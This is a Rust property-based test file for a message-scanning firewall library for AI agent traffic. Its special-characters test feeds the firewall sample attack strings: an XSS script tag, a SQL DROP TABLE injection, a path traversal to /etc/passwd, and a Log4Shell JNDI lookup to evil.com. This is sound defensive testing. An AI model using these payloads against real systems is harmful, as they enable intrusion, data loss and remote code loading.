/// Property-based tests for llamafirewall-core
///
/// These tests use proptest to generate random inputs and verify invariants.

use llamafirewall_core::{
    types::{Message, Role, ScanDecision, ScanResult, ScanStatus},
    scanner::{Scanner, ScanError},
    Configuration, Firewall,
};
use proptest::prelude::*;
use std::sync::Arc;
use async_trait::async_trait;

/// Simple test scanner that always returns Allow
#[derive(Debug)]
struct AlwaysAllowScanner;

#[async_trait]
impl Scanner for AlwaysAllowScanner {
    fn name(&self) -> &str {
        "AlwaysAllowScanner"
    }

    async fn scan(
        &self,
        _message: &Message,
        _trace: Option<&[Arc<Message>]>,
    ) -> Result<ScanResult, ScanError> {
        Ok(ScanResult {
            decision: ScanDecision::Allow,
            score: 0.0,
            reason: "Always allows".to_string(),
            status: ScanStatus::Success,
        })
    }
}

/// Simple test scanner that always returns Block
#[derive(Debug)]
struct AlwaysBlockScanner;

#[async_trait]
impl Scanner for AlwaysBlockScanner {
    fn name(&self) -> &str {
        "AlwaysBlockScanner"
    }

    async fn scan(
        &self,
        _message: &Message,
        _trace: Option<&[Arc<Message>]>,
    ) -> Result<ScanResult, ScanError> {
        Ok(ScanResult {
            decision: ScanDecision::Block,
            score: 1.0,
            reason: "Always blocks".to_string(),
            status: ScanStatus::Success,
        })
    }
}

/// Strategy to generate random roles
fn role_strategy() -> impl Strategy<Value = Role> {
    prop_oneof![
        Just(Role::User),
        Just(Role::Assistant),
        Just(Role::System),
        Just(Role::Tool),
        Just(Role::Memory),
    ]
}

/// Strategy to generate random messages with arbitrary content
fn message_strategy() -> impl Strategy<Value = Message> {
    (role_strategy(), ".*").prop_map(|(role, content)| Message::new(role, content))
}

proptest! {
    /// Test that Message creation never panics with arbitrary inputs
    #[test]
    fn test_message_creation_never_panics(role in role_strategy(), content in ".*") {
        let _ = Message::new(role, content);
    }

    /// Test that Message serialization round-trips correctly
    #[test]
    fn test_message_serialization_roundtrip(msg in message_strategy()) {
        let json = serde_json::to_string(&msg).unwrap();
        let deserialized: Message = serde_json::from_str(&json).unwrap();
        assert_eq!(msg.role, deserialized.role);
        assert_eq!(msg.content, deserialized.content);
    }

    /// Test that firewall scanning never panics with arbitrary messages
    #[test]
    fn test_firewall_scan_never_panics(msg in message_strategy()) {
        let rt = tokio::runtime::Runtime::new().unwrap();

        let config = Configuration::new()
            .add_scanner(Role::User, Arc::new(AlwaysAllowScanner));

        let firewall = Firewall::new(config).unwrap();

        // Should never panic, even with arbitrary input
        let _result = rt.block_on(firewall.scan(&msg, None));
    }

    /// Test that AlwaysAllowScanner always returns Allow decision
    #[test]
    fn test_always_allow_scanner_invariant(msg in message_strategy()) {
        let rt = tokio::runtime::Runtime::new().unwrap();
        let scanner = AlwaysAllowScanner;

        let result = rt.block_on(scanner.scan(&msg, None)).unwrap();
        assert_eq!(result.decision, ScanDecision::Allow);
        assert_eq!(result.score, 0.0);
    }

    /// Test that AlwaysBlockScanner always returns Block decision
    #[test]
    fn test_always_block_scanner_invariant(msg in message_strategy()) {
        let rt = tokio::runtime::Runtime::new().unwrap();
        let scanner = AlwaysBlockScanner;

        let result = rt.block_on(scanner.scan(&msg, None)).unwrap();
        assert_eq!(result.decision, ScanDecision::Block);
        assert_eq!(result.score, 1.0);
    }

    /// Test that firewall with Block scanner always blocks
    #[test]
    fn test_firewall_with_block_scanner(msg in message_strategy()) {
        let rt = tokio::runtime::Runtime::new().unwrap();

        let config = Configuration::new()
            .add_scanner(Role::User, Arc::new(AlwaysBlockScanner));

        let firewall = Firewall::new(config).unwrap();

        let result = rt.block_on(firewall.scan(&msg, None));

        // If message role is User, should be blocked
        if msg.role == Role::User {
            assert_eq!(result.decision, ScanDecision::Block);
        } else {
            // Other roles have no scanners, should allow
            assert_eq!(result.decision, ScanDecision::Allow);
        }
    }

    /// Test that empty content messages are handled correctly
    #[test]
    fn test_empty_content_handling(role in role_strategy()) {
        let msg = Message::new(role, "");
        let rt = tokio::runtime::Runtime::new().unwrap();

        let config = Configuration::new()
            .add_scanner(role, Arc::new(AlwaysAllowScanner));

        let firewall = Firewall::new(config).unwrap();
        let _result = rt.block_on(firewall.scan(&msg, None));
    }

    /// Test that very long content is handled without panicking
    #[test]
    fn test_long_content_handling(role in role_strategy(), n in 1000usize..10000) {
        let content = "a".repeat(n);
        let msg = Message::new(role, &content);

        let rt = tokio::runtime::Runtime::new().unwrap();
        let config = Configuration::new()
            .add_scanner(role, Arc::new(AlwaysAllowScanner));

        let firewall = Firewall::new(config).unwrap();
        let _result = rt.block_on(firewall.scan(&msg, None));
    }

    /// Test that special characters in content don't cause issues
    #[test]
    fn test_special_characters_handling(role in role_strategy()) {
        let special_chars = vec![
            "\n\r\t",
            "\u{0000}",
            "emoji 😀🚀🔥",
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
        ];

        let rt = tokio::runtime::Runtime::new().unwrap();
        let config = Configuration::new()
            .add_scanner(role, Arc::new(AlwaysAllowScanner));

        let firewall = Firewall::new(config).unwrap();

        for content in special_chars {
            let msg = Message::new(role, content);
            let _result = rt.block_on(firewall.scan(&msg, None));
        }
    }

    /// Test that trace creation and scanning works with arbitrary messages
    #[test]
    fn test_trace_handling(messages in prop::collection::vec(message_strategy(), 0..20)) {
        let rt = tokio::runtime::Runtime::new().unwrap();
        let config = Configuration::new()
            .add_scanner(Role::User, Arc::new(AlwaysAllowScanner));

        let firewall = Firewall::new(config).unwrap();

        // Convert messages to Arc<Message> for trace
        let trace: Vec<Arc<Message>> = messages.iter()
            .map(|m| Arc::new(m.clone()))
            .collect();

        if let Some(first) = messages.first() {
            let _result = rt.block_on(firewall.scan(first, Some(&trace)));
        }
    }
}

/// Additional unit tests for edge cases
#[cfg(test)]
mod edge_case_tests {
    use super::*;

    #[tokio::test]
    async fn test_firewall_with_no_scanners() {
        let config = Configuration::new();
        let firewall = Firewall::new(config).unwrap();

        let msg = Message::new(Role::User, "test");
        let result = firewall.scan(&msg, None).await;

        // No scanners means allow
        assert_eq!(result.decision, ScanDecision::Allow);
    }

    #[tokio::test]
    async fn test_firewall_with_multiple_scanners_same_role() {
        let config = Configuration::new()
            .add_scanner(Role::User, Arc::new(AlwaysAllowScanner))
            .add_scanner(Role::User, Arc::new(AlwaysBlockScanner));

        let firewall = Firewall::new(config).unwrap();

        let msg = Message::new(Role::User, "test");
        let result = firewall.scan(&msg, None).await;

        // Block decision should take precedence
        assert_eq!(result.decision, ScanDecision::Block);
    }

    #[tokio::test]
    async fn test_message_clone() {
        let msg1 = Message::new(Role::User, "test content");
        let msg2 = msg1.clone();

        assert_eq!(msg1.role, msg2.role);
        assert_eq!(msg1.content, msg2.content);
    }

    #[tokio::test]
    async fn test_scan_result_serialization() {
        let result = ScanResult {
            decision: ScanDecision::Block,
            score: 0.95,
            reason: "Test reason".to_string(),
            status: ScanStatus::Success,
        };

        let json = serde_json::to_string(&result).unwrap();
        let deserialized: ScanResult = serde_json::from_str(&json).unwrap();

        assert_eq!(result.decision, deserialized.decision);
        assert_eq!(result.score, deserialized.score);
        assert_eq!(result.reason, deserialized.reason);
        assert_eq!(result.status, deserialized.status);
    }
}
